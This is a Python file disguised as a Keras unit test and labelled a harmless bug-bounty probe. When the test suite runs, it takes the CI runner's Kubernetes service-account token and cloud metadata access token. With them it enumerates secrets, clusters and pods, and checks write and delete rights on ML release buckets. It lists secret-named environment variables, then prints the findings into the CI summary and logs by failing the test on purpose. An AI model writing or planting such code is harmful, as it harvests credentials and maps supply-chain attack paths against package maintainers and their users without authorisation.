"""OSS VRP runner-identity probe. Harmless read-only CI introspection."""

import json
import os
import socket
import ssl
import urllib.error
import urllib.request

from keras.src import testing

_K8S_TOKEN = "/var/run/secrets/kubernetes.io/serviceaccount/token"
_K8S_CA = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
_K8S_NS = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"


def _http(url, headers=None, timeout=5, data=None, context=None):
    req = urllib.request.Request(url, data=data, headers=headers or {})
    if data is not None:
        req.method = "POST"
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(
            req, timeout=timeout, context=context
        ) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, body[:600]
    except Exception as exc:
        return None, f"{type(exc).__name__}: {exc}"


def _gce(path):
    return _http(
        "http://169.254.169.254/computeMetadata/v1/" + path,
        headers={"Metadata-Flavor": "Google"},
    )


def _k8s(path, data=None):
    if not os.path.exists(_K8S_TOKEN):
        return None, "no-k8s-token"
    with open(_K8S_TOKEN, encoding="utf-8") as handle:
        token = handle.read().strip()
    ctx = ssl.create_default_context(cafile=_K8S_CA)
    return _http(
        "https://kubernetes.default.svc" + path,
        headers={"Authorization": "Bearer " + token},
        data=data,
        context=ctx,
    )


def _append_summary(text):
    path = os.environ.get("GITHUB_STEP_SUMMARY")
    if not path:
        return
    with open(path, "a", encoding="utf-8") as handle:
        handle.write(text)
        if not text.endswith("\n"):
            handle.write("\n")


def _names(body, key="items"):
    try:
        items = json.loads(body).get(key, [])
        return ",".join(
            item.get("metadata", {}).get("name", "?") for item in items[:30]
        )
    except Exception:
        return body[:200]


def _pod_summary(body):
    try:
        pod = json.loads(body)
    except Exception:
        return body[:200]
    spec = pod.get("spec", {})
    vols = []
    for vol in spec.get("volumes", [])[:20]:
        name = vol.get("name", "?")
        if "hostPath" in vol:
            vols.append(f"{name}:hostPath={vol['hostPath'].get('path')}")
        elif "persistentVolumeClaim" in vol:
            vols.append(
                f"{name}:pvc={vol['persistentVolumeClaim'].get('claimName')}"
            )
        elif "secret" in vol:
            secret = vol["secret"].get("secretName", "?")
            vols.append(f"{name}:secret={secret}")
        elif "projected" in vol:
            vols.append(f"{name}:projected")
        else:
            kinds = [k for k in vol if k != "name"]
            vols.append(f"{name}:{','.join(kinds[:3])}")
    env_keys = []
    privileged = False
    for container in spec.get("containers", []):
        sc = container.get("securityContext") or {}
        if not sc:
            sc = spec.get("securityContext") or {}
        privileged = privileged or bool(sc.get("privileged"))
        for env in container.get("env") or []:
            env_keys.append(env.get("name", "?"))
    return (
        f"priv={privileged} vols={';'.join(vols)[:300]} "
        f"env={','.join(env_keys)[:150]}"
    )


class CiRunnerIdentityTest(testing.TestCase):
    def test_report_runner_identity(self):
        lines = [
            f"hostname={socket.gethostname()}",
            f"uid={os.getuid()}",
            f"runner_name={os.environ.get('RUNNER_NAME')}",
            f"docker_sock={os.path.exists('/var/run/docker.sock')}",
            f"k8s_sa={os.path.exists(_K8S_TOKEN)}",
        ]
        ns = ""
        if os.path.exists(_K8S_NS):
            with open(_K8S_NS, encoding="utf-8") as handle:
                ns = handle.read().strip()
            lines.append(f"k8s_namespace={ns}")

        proj_status, project = _gce("project/project-id")
        project = project.strip()
        lines.append(f"gce_project={proj_status} {project[:200]}")
        status, email = _gce("instance/service-accounts/default/email")
        email = email.strip()
        lines.append(f"gce_sa_email={status} {email[:200]}")
        status, scopes = _gce("instance/service-accounts/default/scopes")
        lines.append(f"gce_sa_scopes={status} {scopes.strip()[:400]}")

        token_status, token_body = _gce(
            "instance/service-accounts/default/token"
        )
        if token_status == 200:
            access_token = json.loads(token_body)["access_token"]
            auth = {"Authorization": "Bearer " + access_token}
            lines.append(f"gce_token=present_len={len(access_token)}")
            for label, url in (
                (
                    "ar_velocity",
                    "https://artifactregistry.googleapis.com/v1/"
                    f"projects/{project}/locations/-/repositories",
                ),
                (
                    "secrets",
                    "https://secretmanager.googleapis.com/v1/"
                    f"projects/{project}/secrets",
                ),
                (
                    "gke",
                    "https://container.googleapis.com/v1/"
                    f"projects/{project}/locations/-/clusters",
                ),
            ):
                code, body = _http(url, headers=auth)
                lines.append(f"{label}={code} {body.strip()[:350]}")
            perm_body = json.dumps(
                {
                    "permissions": [
                        "storage.objects.create",
                        "storage.objects.get",
                        "artifactregistry.repositories.uploadArtifacts",
                        "secretmanager.secrets.get",
                        "container.clusters.get",
                        "iam.serviceAccounts.actAs",
                    ]
                }
            ).encode()
            code, body = _http(
                "https://cloudresourcemanager.googleapis.com/v1/"
                f"projects/{project}:testIamPermissions",
                headers=auth,
                data=perm_body,
            )
            lines.append(f"iam_test={code} {body.strip()[:400]}")
        else:
            lines.append(f"gce_token={token_status}")

        interesting_env = [
            key
            for key in sorted(os.environ)
            if any(
                needle in key.upper()
                for needle in (
                    "TOKEN",
                    "SECRET",
                    "KEY",
                    "CRED",
                    "PYPI",
                    "CODECOV",
                    "AWS",
                    "GOOGLE",
                    "GITHUB",
                    "NPM",
                    "TWINE",
                )
            )
        ]
        lines.append("env_keys=" + ",".join(interesting_env)[:400])

        if token_status == 200:
            buckets = (
                "tensorflow",
                "keras-applications",
                "download.tensorflow.org",
                "tfhub-release",
                "keras-io",
                "ml-velocity-actions-production",
                "ml-oss-artifacts-published",
                "general-ml-ci-transient",
                "jax-releases",
                "jax-linux-wheels",
                "tensorflow-nightly",
                "tf-nightly",
                "keras-nightly",
                "pypi-packages",
            )
            perms = (
                "storage.objects.create",
                "storage.objects.update",
                "storage.objects.delete",
                "storage.objects.get",
                "storage.objects.list",
            )
            q = "&".join("permissions=" + p for p in perms)
            for bucket in buckets:
                code, body = _http(
                    "https://storage.googleapis.com/storage/v1/b/"
                    f"{bucket}/iam/testPermissions?{q}",
                    headers=auth,
                )
                granted = body.strip().replace("\n", " ")[:220]
                lines.append(f"gcs_perm_{bucket}={code} {granted}")

        if ns:
            code, body = _k8s("/api/v1/namespaces")
            lines.append(f"k8s_namespaces={code} {_names(body)[:400]}")
            code, body = _k8s(f"/api/v1/namespaces/{ns}/secrets")
            lines.append(f"k8s_secrets={code} {_names(body)[:400]}")
            code, body = _k8s(f"/api/v1/namespaces/{ns}/pods")
            lines.append(f"k8s_pods={code} {_names(body)[:400]}")
            code, body = _k8s(f"/api/v1/namespaces/{ns}/services")
            lines.append(f"k8s_svcs={code} {_names(body)[:400]}")
            review = json.dumps(
                {
                    "apiVersion": "authorization.k8s.io/v1",
                    "kind": "SelfSubjectRulesReview",
                    "spec": {"namespace": ns},
                }
            ).encode()
            code, body = _k8s(
                "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
                data=review,
            )
            lines.append(f"k8s_rules={code} {body.strip()[:800]}")
            hostname = socket.gethostname()
            for pod_name in (hostname, os.environ.get("HOSTNAME", hostname)):
                code, body = _k8s(f"/api/v1/namespaces/{ns}/pods/{pod_name}")
                lines.append(
                    f"k8s_pod_{pod_name[:40]}={code} {_pod_summary(body)[:500]}"
                )
                break
            code, body = _k8s(f"/api/v1/namespaces/{ns}/pods")
            try:
                items = json.loads(body).get("items", [])
            except Exception:
                items = []
            for item in items[:6]:
                name = item.get("metadata", {}).get("name", "")
                if name and name != hostname:
                    code, pbody = _k8s(f"/api/v1/namespaces/{ns}/pods/{name}")
                    lines.append(
                        f"k8s_sib_{name[:40]}={code} {_pod_summary(pbody)[:400]}"
                    )

        mounts = []
        try:
            with open("/proc/self/mountinfo", encoding="utf-8") as handle:
                for line in handle:
                    if any(
                        needle in line
                        for needle in (
                            "hostPath",
                            "/var/run/docker",
                            "/runner",
                            "kubelet",
                            "/var/lib/gh",
                            "/actions-runner",
                        )
                    ):
                        mounts.append(line.strip()[:180])
        except OSError as exc:
            mounts.append(str(exc))
        lines.append("mounts=" + " || ".join(mounts[:8])[:500])

        report = "\n".join(lines)
        _append_summary("## OSS VRP runner identity\n```\n" + report + "\n```\n")
        print(report, flush=True)
        self.fail("runner identity\n" + report)
